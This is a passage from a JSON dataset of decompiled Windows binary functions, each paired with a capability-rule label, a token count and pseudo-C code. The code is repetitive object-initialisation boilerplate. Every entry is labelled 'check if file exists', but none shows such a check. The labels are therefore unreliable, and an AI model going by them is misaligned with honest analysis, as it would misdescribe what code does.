'\\0') {\n                        fcn.00401b10(0xc);\n                        uVar3 = fcn.00401440(&var_4ch);\n                        fcn.0041bbb0(&var_28h, uVar3);\n                        var_b0h = &var_28h;\n                        var_a0h = fcn.0040e9d0();\n                        var_b8h = fcn.0040e4e0();\n                        for (; var_a0h != var_b8h; var_a0h = var_a0h + 0x18) {\n                            fcn.00407620(var_a0h);\n                            fcn.0041b6c0(&var_7ch);\n                            fcn.00404f30();\n                        }\n                        fcn.004049d0();\n                    }\n                }\n                fcn.00404f30();\n            }\n            fcn.00404f30();\n        }\n        fcn.00404f30();\n    }\n    uVar3 = fcn.00401440(&var_1ch);\n    fcn.00404a10(uVar3);\n    fcn.004049d0();\n    fcn.004049d0();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_01);\n    return;\n}\n",
        "token_count": 993
    },
    "0042180a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0042180a(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x494f08;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00422115(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x494f08 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "004218b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004218b0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x494ef8;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00422192(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x494ef8 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "00421956": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00421956(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x494efc;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042220d(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x494efc = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "004219fc": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004219fc(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x494f00;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042228a(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x494f00 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "00421aa2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00421aa2(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x494f04;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00422307(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x494f04 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "0042816d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0042816d(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952d0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.00429fe6(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952d0 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "00428213": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428213(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x49529c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a061(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x49529c = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "004282b9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004282b9(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952b0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a0dc(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952b0 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 457
    },
    "0042835f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0042835f(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x49527c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a17e(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x49527c = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 455
    },
    "00428405": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428405(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952a0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a220(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952a0 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 455
    },
    "004284ab": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004284ab(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x49526c;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a2a5(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x49526c = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 455
    },
    "00428551": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428551(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952b4;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a32a(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952b4 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "004285f7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004285f7(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495280;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a3a7(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495280 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 454
    },
    "0042869d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0042869d(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952b8;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a424(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952b8 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 456
    },
    "00428743": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428743(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495284;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a4a1(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495284 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "004287e9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004287e9(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952bc;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a51e(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952bc = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 455
    },
    "0042888f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0042888f(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x495288;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a59b(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x495288 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 453
    },
    "00428935": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.00428935(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952c4;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a618(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -0x10) = piVar1;\n        *(unaff_EBP + -4) = 1;\n        fcn.00425320(piVar1);\n        pcVar2 = *(*piVar1 + 4);\n        (**0x4742a4)();\n        (*pcVar2)();\n        *0x4952c4 = piVar1;\n    }\n    fcn.00421541();\n    fcn.0043ac9c();\n    return;\n}\n",
        "token_count": 455
    },
    "004289db": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.004289db(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint arg_8h_00;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0043acd3(0x14);\n    fcn.004214e9(0);\n    piVar1 = *0x4952c0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x10) = piVar1;\n    arg_8h_00 = fcn.00401800();\n    iVar3 = fcn.00422397(arg_8h_00);\n    if ((iVar3 == 0) && (piVar1 == NULL)) {\n        iVar3 = fcn.0042a6b1(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar3 == -1) {\n            fcn.00421b9b();\n            fcn.00451487(unaff_EBP + -0x20, 0x48c838);\n            pcVar2 = swi(3);\n            